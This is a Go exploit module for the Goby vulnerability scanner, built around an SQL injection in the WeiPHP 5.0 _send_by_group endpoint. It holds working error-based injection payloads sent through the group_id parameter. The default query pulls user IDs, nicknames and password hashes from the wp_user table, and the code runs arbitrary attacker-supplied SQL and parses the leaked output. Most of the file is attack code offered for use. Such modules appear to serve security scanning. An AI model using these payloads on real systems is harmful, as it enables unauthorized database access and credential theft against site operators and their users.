package exploits

import (
	"encoding/hex"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "WeiPHP _send_by_group group_id SQL Injection Vulnerability",
    "Description": "<p>weiphp is an open source, efficient and concise WeChat development platform, implemented based on the oneThink content management framework.</p><p>Weiphp version 5.0 _send_by_group has a SQL injection vulnerability, which allows an attacker to obtain sensitive information such as database username and password.</p>",
    "Product": "WeiPHP",
    "Homepage": "http://www.weiphp.cn/",
    "DisclosureDate": "2023-03-12",
    "Author": "h1ei1",
    "FofaQuery": "body=\"/css/weiphp.css\" || body=\"WeiPHP\"",
    "GobyQuery": "body=\"/css/weiphp.css\" || body=\"WeiPHP\"",
    "Level": "2",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"http://www.weiphp.cn/.\">http://www.weiphp.cn/.</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "select substr(group_concat(uid,nickname,password),1,31) from wp_user",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/public/index.php/weixin/message/_send_by_group",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "group_id[0]=exp&group_id[1]=) and updatexml(1,concat(0x7e,md5(123),0x7e),1) --"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "202cb962ac59075b964b07152d234b7",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/public/index.php/weixin/message/_send_by_group",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "group_id[0]=exp&group_id[1]=) and updatexml(1,concat(0x7e,{{{sql}}},0x7e),1) --"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|XPATH syntax error:(.*?)</h1>"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "WeiPHP 微信开发平台 _send_by_group 文件 group_id 参数 SQL 注入漏洞",
            "Product": "WeiPHP",
            "Description": "<p>weiphp 是一个开源，高效，简洁的微信开发平台，基于 oneThink 内容管理框架实现。 <br></p><p>weiphp 5.0 版本 _send_by_group 存在 SQL 注入漏洞，攻击者可获取数据库用户名密码等敏感信息。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"http://www.weiphp.cn/\">http://www.weiphp.cn/</a></p>",
            "Impact": "<p>除了利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "WeiPHP _send_by_group group_id SQL Injection Vulnerability",
            "Product": "WeiPHP",
            "Description": "<p>weiphp is an open source, efficient and concise WeChat development platform, implemented based on the oneThink content management framework.</p><p>Weiphp version 5.0 _send_by_group has a SQL injection vulnerability, which allows an attacker to obtain sensitive information such as database username and password.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"http://www.weiphp.cn/.\">http://www.weiphp.cn/.</a><br></p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-09-27",
    "PocId": "10840"
}`

	sendPaylaoda707c3d7 := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewPostRequestConfig("/public/index.php/weixin/message/_send_by_group")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg.Data = "group_id[0]=exp&group_id[1]=" + url.QueryEscape(") and updatexml(1,concat(0x7e,("+sql+"),0x7e),1) --")
		return httpclient.DoHttpRequest(hostInfo, cfg)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(8)
			sql := "/*!50000select*/ 0x" + hex.EncodeToString([]byte(checkStr))
			rsp, _ := sendPaylaoda707c3d7(u, sql)
			return rsp != nil && rsp.StatusCode == 500 && strings.Contains(rsp.Utf8Html, checkStr)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "sql" {
				sql := goutils.B2S(ss.Params["sql"])
				rsp, err := sendPaylaoda707c3d7(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
				} else if strings.Contains(rsp.Utf8Html, "'~") {
					expResult.Success = true
					// 报错注入 32 字符回显长度限制
					expResult.Output = rsp.Utf8Html[strings.Index(rsp.Utf8Html, "'~")+2 : strings.Index(rsp.Utf8Html, "'~")+33]
				} else {
					expResult.Success = false
					expResult.Output = `漏洞利用失败`
				}
			} else if attackType == "sqlPoint" {
				checkStr := goutils.RandomHexString(8)
				sql := "/*!50000select*/ 0x" + hex.EncodeToString([]byte(checkStr))
				rsp, _ := sendPaylaoda707c3d7(expResult.HostInfo, sql)
				expResult.Success = rsp != nil && rsp.StatusCode == 500 && strings.Contains(rsp.Utf8Html, checkStr)
				if expResult.Success {
					expResult.Output = `POST /public/index.php/weixin/message/_send_by_group HTTP/2
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 139
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate

group_id[0]=exp&group_id[1]=%29+and+updatexml%281%2Cconcat%280x7e%2C%28select+substr%28group_concat%28uid%2Cnickname%2Cpassword%29%2C1%2C31%29+from+wp_user%29%2C0x7e%29%2C1%29+--`
				}
			} else {
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
